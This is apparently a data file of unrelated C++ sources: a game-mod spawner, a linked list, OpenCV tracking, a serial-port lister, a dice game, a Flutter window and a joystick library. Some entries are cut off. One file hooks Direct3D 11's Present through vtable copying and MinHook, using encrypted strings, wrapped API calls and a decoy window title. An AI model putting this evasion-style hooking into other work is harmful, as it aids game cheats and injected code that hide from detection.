    "#include \"actorspawner.hpp\"\r\n\r\nncp_over(0x020399D4) static constexpr const ActorProfile* profile = &ActorSpawner::profile;\r\n\r\nvoid ActorSpawner::doSpawn() {\r\n\r\n\tVec3 sPos = position;\r\n\tsPos.y -= 0x10000;\t\t// Origin pos: Bottom-left of sprite\r\n\r\n\tsPos.x += spawnerSettings->offsetX * 0x1000;\r\n\tsPos.y += spawnerSettings->offsetY * 0x1000;\r\n\r\n\tu16 objID = spawnerSettings->objectID;\r\n\r\n\tif (sActor) {\r\n\t\tStageEntity* spawnedActor = (StageEntity*)spawnActor(objID, spawnerSettings->settings, &sPos);\r\n\t\tif (objID == 103 || objID == 185) {\r\n\t\t\tspawnedActor->collisionSwitch |= 0x4620; // manually set spikedball collision switch lmao\r\n\t\t}\t\t\t\t\t\t\t\t\t\t\t // has to be a better way of doing this\r\n\t}\r\n\r\n\tsPos.x += spawnerSettings->particleOffsetX * 0x1000;\r\n\tsPos.y += spawnerSettings->particleOffsetY * 0x1000;\r\n\r\n\tif (sParticles) {\r\n\t\tParticle::Handler::createParticle(spawnerSettings->particleID, sPos);\r\n\t}\r\n\r\n\tif (sSFX) {\r\n\t\tSound::playSFX(spawnerSettings->sfxID, &sPos);\r\n\t}\r\n\r\n\tactorSpawned = true;\r\n}\r\n\t\r\ns32 ActorSpawner::onCreate() {\r\n\r\n\tactorSpawned = false;\r\n\r\n\t//activeSize = Vec2(5000,5000);\r\n\r\n\tspawnerSettingsID = (settings & 0xFF0000) >> 16;\r\n\tspawnerSettings = (ActorSpawnerSettings*)(Stage::stageBlocks.objectBanks + 16 + spawnerSettingsID*16);\r\n\r\n\tsActor = (settings & 0x4000) == 0;\r\n\tsParticles = (settings & 0x1000) == 0;\r\n\tsSFX = (settings & 0x2000) == 0;\r\n\tsFirstTick = (settings & 0x8000) == 0;\r\n\r\n\teventID = settings >> 24;\r\n\teventWasActive = false;\r\n\tspawnDelay = settings & 0xFFF;\r\n\ttimer = 0;\r\n\r\n\t//Log() << \"settings: \" << Log::Hex << settings << \"\\n\";\r\n\t//Log() << \"sfxID: \" << Log::Dec << spawnerSettings->sfxID << \"\\n\";\r\n\r\n\treturn 1;\r\n}\r\n\r\nbool ActorSpawner::updateMain() {\r\n\r\n\tif (eventID == 0 && spawnDelay == 0)\r\n\t\treturn 1;\r\n\r\n\tif (spawnDelay == 0) { // no spawn delay set\r\n\t\tif (Stage::getEvent(eventID) && actorSpawned)\r\n\t\t\treturn 1;\r\n\r\n\t\tif (!Stage::getEvent(eventID) && actorSpawned) \r\n\t\t\tactorSpawned = false;\r\n\r\n\t\tif (Stage::getEvent(eventID) && !actorSpawned){ \r\n\t\t\tdoSpawn();\r\n\t\t}\r\n\r\n\t} else {\r\n\t\tif (eventID == 0) {\r\n\t\t\teventActive = true;\r\n\t\t}\r\n\t\telse\r\n\t\t\teventActive = Stage::getEvent(eventID);\r\n\r\n\t\tif (eventWasActive && !eventActive)\r\n\t\t\ttimer = 0;\r\n\r\n\t\tif (eventActive) {\r\n\t\t\tif (sFirstTick && !eventWasActive)\r\n\t\t\t\tdoSpawn();\r\n\t\t\tif (timer > spawnDelay) {\r\n\t\t\t\tdoSpawn();\r\n\t\t\t\ttimer = 0;\r\n\t\t\t}\r\n\t\t\ttimer++;\r\n\t\t}\r\n\r\n\t\teventWasActive = eventActive;\r\n\t}\r\n\r\n\tdestroyInactive(0);\r\n\r\n\treturn 1;\r\n}\r\n\r\ns32 ActorSpawner::onDestroy() {\r\n\treturn 1;\r\n}",
    "#include \"dList.h\"\n\nvoid DListNodeInit(DList* node)\n{\n\tnode->next = nullptr;\n\tnode->prev = nullptr;\n}\n\nvoid DListPushFront(DList** head, DList* newNode)\n{\n\tif ((*head) == newNode)\n\t\treturn;\n\n\tnewNode->next = (*head);\n\tnewNode->prev = nullptr;\n\n\tif ((*head) != nullptr)\n\t{\n\t\t(*head)->prev = newNode;\n\t}\n\n\t(*head) = newNode;\n}\n\n\nvoid DListRemove(DList** head, DList* node)\n{\n\tif ((*head) == nullptr || node == nullptr)\n\t\treturn;\n\n\tif ((*head) == node) // if node is head set the pointer of head to next\n\t{\n\t\t(*head) = node->next;\n\t}\n\telse\n\t{\n\t\tnode->prev->next = node->next; // set previous node to skip current node\n\t}\n\n\tif (node->next == nullptr) // is last node\n\t\treturn;\n\t\n\tnode->next->prev = node->prev; // set next node to skip current node\n}\n\nvoid DListPushBack(DList** head, DList* newNode)\n{\n\tnewNode->next = nullptr;\n\t\n\t// insert to head if list is empty\n\tif ((*head) == nullptr) {\n\t\tnewNode->prev = nullptr;\n\t\t(*head) = newNode;\n\t\treturn;\n\t}\n\n\t// insert to end of list\n\tDList* last = (*head); \n\twhile (last->next != nullptr)\n\t\tlast = last->next;\n\n\tlast->next = newNode;\n\tnewNode->prev = last;\n}\n\n\nvoid printDList(DList* head)\n{\n\tDList* last = head;\n\twhile (last != nullptr)\n\t{\n\t\twrite_serial_hex((uint64_t)last);\n\t\twrite_serial(\" <-> \");\n\t\t// screen.printHex((uint64_t)last);\n\t\t// screen.print(\" -> \");\n\t\tlast = last->next;\n\t}\n\t// screen.print(\"nullptr\");\n\t// screen.newLine();\n\twrite_serial(\"nullptr\");\n}\n\n\n// void DListInsertAfter(DList* node, DList* newNode)\n// {\n// \tif (node == newNode)\n// \t\treturn;\n\n// \tnewNode->next = node->next;\n// \tnode->next = newNode;\n// \tnewNode->prev = node;\n\n// \tif (newNode->next != nullptr)\n// \t\tnewNode->next->prev = newNode;\n// }\n\n// void DListInsertBefore(DList** head, DList* node, DList* newNode)\n// {\n// \tif (newNode == nullptr)\n// \t\treturn;\n\n// \tnewNode->prev = node->prev;\n\n// \tnode->prev = newNode;\n\n// \tnewNode->next = node;\n\n// \tif (newNode->prev != nullptr)\n// \t\tnewNode->prev->next = newNode;\n// \telse\n// \t\t(*head) = newNode;\n// }\n\n",
    "//\n// Created by Alan on 2024/4/2.\n//\n#include <opencv2/opencv.hpp>\n#include <iostream>\n#include <fstream>\n\nusing namespace cv;\nusing namespace std;\n\nint main() {\n    // \u6253\u5f00\u89c6\u9891\u6587\u4ef6\n//    string videoPath = \"../cars.mp4\";\n//    string videoPath = \"../234_1712047332.mp4\";\n    string videoPath = \"../ball.mp4\";\n//    string videoPath = \"../\u9e21\u4f60\u592a\u7f8e.mp4\";\n    // \u9996\u5148\u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5b58\u5728\n    ifstream file(videoPath);\n    if (!file.good()) {\n        cerr << \"Error: File not found or cannot be opened: \" << videoPath << endl;\n        return -1;\n    }\n\n    // \u6253\u5f00\u89c6\u9891\u6587\u4ef6\n    VideoCapture capture(videoPath);\n    if (!capture.isOpened()) {\n        cerr << \"Error opening video file: \" << videoPath << endl;\n        return -1;\n    }\n\n    // \u8bfb\u53d6\u7b2c\u4e00\u5e27\n    Mat frame;\n    capture >> frame;\n    if (frame.empty()) {\n        cerr << \"Error reading video\" << endl;\n        return -1;\n    }\n\n    imshow(\"Frame\", frame);\n    waitKey(1);  // \u77ed\u6682\u7b49\u5f85\u786e\u4fdd\u56fe\u50cf\u663e\u793a\n\n    // \u9009\u62e9\u8ddf\u8e2a\u76ee\u6807\n    Rect track_window = selectROI(\"Tracking\", frame, true, false);\n    if (track_window.width <= 0 || track_window.height <= 0) {\n        cerr << \"Error: Track window has invalid size.\" << endl;\n        cerr << \"track_window.width = \" << track_window.width << endl;\n        cerr << \"track_window.height = \" << track_window.height << endl;\n        cerr << \"track_window.size() = \" << track_window.size() << endl;\n        cout << \"Selected ROI: \" << track_window << endl;\n        return -1;\n    } else {\n        cout << \"Selected ROI: \" << track_window << endl;\n    }\n\n\n    // \u8bbe\u7f6eROI\uff08\u611f\u5174\u8da3\u533a\u57df\uff09\u7528\u4e8e\u8ddf\u8e2a\n    Mat roi = frame(track_window);\n    if (roi.empty()) {\n        cerr << \"Error: ROI is empty.\" << endl;\n        return -1;\n    }\n\n    // \u5c06ROI\u8f6c\u6362\u4e3aHSV\u989c\u8272\u7a7a\u95f4\n\n    Mat hsv_roi, mask;\n    cvtColor(roi, hsv_roi, COLOR_BGR2HSV);\n\n\n\n\n\n    inRange(hsv_roi, Scalar(0, 60, 32), Scalar(180, 255, 255), mask);\n\n//    // \u8ba1\u7b97ROI\u7684\u76f4\u65b9\u56fe\n//    Mat roi_hist;\n//    int histSize = 180;\n//    float range[] = { 0, 180 };\n//    const float* histRange = { range };\n//    calcHist(&hsv_roi, 1, 0, mask, roi_hist, 1, &histSize, &histRange);\n//    normalize(roi_hist, roi_hist, 0, 255, NORM_MINMAX);\n\n    // \u5206\u79bbHSV\u901a\u9053\n    vector<Mat> hsv_channels;\n    split(hsv_roi, hsv_channels);\n    Mat hue_channel = hsv_channels[0]; // \u53d6H\u901a\u9053\n\n    cout << \"hue_channel.size() = \" << hue_channel.size() << endl;\n    // \u8f93\u51fahue_channel\u7684\u901a\u9053\u6570\n    cout << \"Hue channel type: \" << hue_channel.type() << endl;\n    cout << \"Hue channel channels: \" << hue_channel.channels() << endl;\n\n    // \u8ba1\u7b97H\u901a\u9053\u7684\u76f4\u65b9\u56fe\n    Mat roi_hist;\n    int histSize = 180;\n    float range[] = { 0, 180 };\n    const float* histRange = { range };\n    calcHist(&hue_channel, 1, 0, mask, roi_hist, 1, &histSize, &histRange,true, false);\n    normalize(roi_hist, roi_hist, 0, 255, NORM_MINMAX);\n\n    // \u8bbe\u7f6e\u8ffd\u8e2a\u53c2\u6570\n    TermCriteria term_crit(TermCriteria::EPS | TermCriteria::COUNT, 10, 1);\n\n    // \u5f00\u59cb\u5904\u7406\u89c6\u9891\n    while (true) {\n        Mat hsv, dst;\n        capture >> frame;\n        if (frame.empty()) break;\n\n        cvtColor(frame, hsv, COLOR_BGR2HSV);\n\n        vector<Mat> hsv_cs;\n        split(hsv, hsv_cs);\n        Mat hue_c = hsv_cs[0]; // \u53d6H\u901a\u9053\n\n\n        calcBackProject(&hue_c, 1, 0, roi_hist, dst, &histRange);\n\n        // \u4f7f\u7528MeanShift\u7b97\u6cd5\u8ddf\u8e2a\n        meanShift(dst, track_window, term_crit);\n\n        // \u753b\u51fa\u5b83\n        rectangle(frame, track_window, Scalar(0, 255, 0), 2);\n\n        // \u4f7f\u7528CamShift\u7b97\u6cd5\u8ddf\u8e2a\n        RotatedRect track_box = CamShift(dst, track_window, term_crit);\n\n        // \u753b\u51fa\u5b83\n        Point2f points[4];\n        track_box.points(points);\n        for (int i = 0; i < 4; i++)\n            line(frame, points[i], points[(i+1)%4], Scalar(0, 0, 255), 2);\n\n        imshow(\"Tracking\", frame);\n\n        // \u6309'q'\u9000\u51fa\n        if (waitKey(30) == 'q') break;\n    }\n\n    capture.release();\n    destroyAllWindows();\n    return 0;\n}\n",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#if defined(_WIN32)\r\n\r\n/*\r\n * Copyright (c) 2014 Craig Lilley <cralilley@gmail.com>\r\n * This software is made available under the terms of the MIT licence.\r\n * A copy of the licence can be obtained from:\r\n * http://opensource.org/licenses/MIT\r\n */\r\n#pragma  comment(lib, \"setupapi.lib\")\r\n#undef UNICODE\r\n#include \"serial.h\"\r\n#include <tchar.h>\r\n#include <windows.h>\r\n#include <setupapi.h>\r\n#include <initguid.h>\r\n#include <devguid.h>\r\n#include <cstring>\r\n\r\nusing serial::PortInfo;\r\nusing std::vector;\r\nusing std::string;\r\n\r\nstatic const DWORD port_name_max_length = 256;\r\nstatic const DWORD friendly_name_max_length = 256;\r\nstatic const DWORD hardware_id_max_length = 256;\r\nstatic const DWORD device_id_max_length = 256;\r\n\r\n\r\n// Convert a wide Unicode string to an UTF8 string\r\nstd::string utf8_encode(const std::wstring &wstr) {\r\n  int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);\r\n  std::string strTo(size_needed, 0);\r\n  WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);\r\n  return strTo;\r\n}\r\n\r\nvector<PortInfo>\r\nserial::list_ports() {\r\n  vector<PortInfo> devices_found;\r\n\r\n  HDEVINFO device_info_set = SetupDiGetClassDevs(\r\n                               (const GUID *) &GUID_DEVCLASS_PORTS,\r\n                               NULL,\r\n                               NULL,\r\n                               DIGCF_PRESENT);\r\n\r\n  unsigned int device_info_set_index = 0;\r\n  SP_DEVINFO_DATA device_info_data;\r\n\r\n  device_info_data.cbSize = sizeof(SP_DEVINFO_DATA);\r\n\r\n  while (SetupDiEnumDeviceInfo(device_info_set, device_info_set_index, &device_info_data)) {\r\n    device_info_set_index++;\r\n\r\n    // Get port name\r\n\r\n    HKEY hkey = SetupDiOpenDevRegKey(\r\n                  device_info_set,\r\n                  &device_info_data,\r\n                  DICS_FLAG_GLOBAL,\r\n                  0,\r\n                  DIREG_DEV,\r\n                  KEY_READ);\r\n\r\n    TCHAR port_name[port_name_max_length];\r\n    DWORD port_name_length = port_name_max_length;\r\n\r\n    LONG return_code = RegQueryValueEx(\r\n                         hkey,\r\n                         _T(\"PortName\"),\r\n                         NULL,\r\n                         NULL,\r\n                         (LPBYTE)port_name,\r\n                         &port_name_length);\r\n\r\n    RegCloseKey(hkey);\r\n\r\n    if (return_code != EXIT_SUCCESS) {\r\n      continue;\r\n    }\r\n\r\n    if (port_name_length > 0 && port_name_length <= port_name_max_length) {\r\n      port_name[port_name_length - 1] = '\\0';\r\n    } else {\r\n      port_name[0] = '\\0';\r\n    }\r\n\r\n    // Ignore parallel ports\r\n\r\n    if (_tcsstr(port_name, _T(\"LPT\")) != NULL) {\r\n      continue;\r\n    }\r\n\r\n    // Get port friendly name\r\n\r\n    TCHAR friendly_name[friendly_name_max_length];\r\n    DWORD friendly_name_actual_length = 0;\r\n\r\n    BOOL got_friendly_name = SetupDiGetDeviceRegistryProperty(\r\n                               device_info_set,\r\n                               &device_info_data,\r\n                               SPDRP_FRIENDLYNAME,\r\n                               NULL,\r\n                               (PBYTE)friendly_name,\r\n                               friendly_name_max_length,\r\n                               &friendly_name_actual_length);\r\n\r\n    if (got_friendly_name == TRUE && friendly_name_actual_length > 0) {\r\n      friendly_name[friendly_name_actual_length - 1] = '\\0';\r\n    } else {\r\n      friendly_name[0] = '\\0';\r\n    }\r\n\r\n    // Get hardware ID\r\n\r\n    TCHAR hardware_id[hardware_id_max_length];\r\n    DWORD hardware_id_actual_length = 0;\r\n\r\n    BOOL got_hardware_id = SetupDiGetDeviceRegistryProperty(\r\n                             device_info_set,\r\n                             &device_info_data,\r\n                             SPDRP_HARDWAREID,\r\n                             NULL,\r\n                             (PBYTE)hardware_id,\r\n                             hardware_id_max_length,\r\n                             &hardware_id_actual_length);\r\n\r\n    if (got_hardware_id == TRUE && hardware_id_actual_length > 0) {\r\n      hardware_id[hardware_id_actual_length - 1] = '\\0';\r\n    } else {\r\n      hardware_id[0] = '\\0';\r\n    }\r\n\r\n    TCHAR device_id[device_id_max_length];\r\n    DWORD device_id_actual_length = 0;\r\n\r\n    BOOL got_device_id = SetupDiGetDeviceRegistryProperty(\r\n                           device_info_set,\r\n                           &device_info_data,\r\n                           SPDRP_LOCATION_INFORMATION,\r\n                           NULL,\r\n                           (PBYTE)device_id,\r\n                           device_id_max_length,\r\n                           &device_id_actual_length);\r\n\r\n    if (got_device_id == TRUE && device_id_actual_length > 0) {\r\n      device_id[device_id_actual_length - 1] = '\\0';\r\n    } else {\r\n      device_id[0] = '\\0';\r\n    }\r\n\r\n\r\n\r\n#ifdef UNICODE\r\n    std::string portName = utf8_encode(port_name);\r\n    std::string friendlyName = utf8_encode(friendly_name);\r\n    std::string hardwareId = utf8_encode(hardware_id);\r\n    std::string de",
    "#include <iostream>\n#include <limits>\n#include <random>\n#include <stdexcept>\nusing namespace std;\n\nclass DiceGame {\npublic:\n    DiceGame() : pointsTotal(500), playerWon(false) {}\n\n    void playGame() {\n        string playerName = getPlayerName();\n        do {\n            placeBet();\n            rollDice();\n            calculatePoints();\n            displayPoints();\n            checkGameStatus();\n        } while (playerWantsToContinue());\n    }\n\nprivate:\n    int pointsTotal;\n    int bet;\n    int dice[2];\n    bool playerWon;\n\n    static string getPlayerName() {\n        cout << \"Welcome to the Dice Game! Please enter your name: \";\n        string name;\n        cin >> name;\n        return name;\n    }\n\n    void placeBet() {\n        cout << \"You have \" << pointsTotal << \" points.\" << endl;\n        cout << \"Place your bet: \";\n        while (!(cin >> bet) || bet <= 0 || bet > pointsTotal) {\n            cout << \"Invalid bet. Please enter a value between 1 and \" << pointsTotal << \": \";\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        }\n    }\n\n    void rollDice() {\n        random_device rd;\n        mt19937 gen(rd());\n        uniform_int_distribution<> distrib(1, 6);\n        dice[0] = distrib(gen);\n        dice[1] = distrib(gen);\n        cout << \"Rolled: \" << dice[0] << \" and \" << dice[1] << endl;\n    }\n\n    void calculatePoints() {\n        int sum = dice[0] + dice[1];\n        if (dice[0] == 4 && dice[1] == 4) {\n            pointsTotal += bet + 200;\n        } else if (sum == 7 || sum == 11) {\n            pointsTotal += bet + 100;\n        } else {\n            pointsTotal -= (25 + bet);\n        }\n    }\n\n    void displayPoints() const {\n        if (pointsTotal > 0) {\n            cout << \"Current points: \" << pointsTotal << endl;\n        } else {\n            cout << \"You've run out of points!\" << endl;\n        }\n    }\n\n    void checkGameStatus() {\n        if (pointsTotal >= 1000) {\n            cout << \"Congratulations! You've won the game with \" << pointsTotal << \" points!\" << endl;\n            playerWon = true;\n        } else if (pointsTotal <= 0) {\n            cout << \"Sorry, you've lost all your points. Better luck next time!\" << endl;\n            playerWon = false;\n        }\n    }\n\n    bool playerWantsToContinue() {\n        if (playerWon || pointsTotal <= 0) {\n            char choice;\n            cout << \"Would you like to play again? (Y/N): \";\n            cin >> choice;\n            if (choice == 'Y' || choice == 'y') {\n                pointsTotal = 500; // Reset points for a new game\n                return true;\n            }\n            return false;\n        }\n        cout << \"Continue playing? (Y/N): \";\n        char choice;\n        cin >> choice;\n        return choice == 'Y' || choice == 'y';\n    }\n};\n\nint main() {\n    try {\n        DiceGame game;\n        game.playGame();\n    } catch (const exception& e) {\n        cerr << \"An error occurred: \" << e.what() << endl;\n    }\n    cout << \"Goodbye! Have a nice day!\" << endl;\n    return 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n  Joystick.cpp\n\n  Copyright (c) 2015-2017, Matthew Heironimus\n\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n  Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n*/\n\n#include \"Joystick.h\"\n#include \"config.h\"\n#include \"FFBDescriptor.h\"\n#include \"filters.h\"\n#ifdef 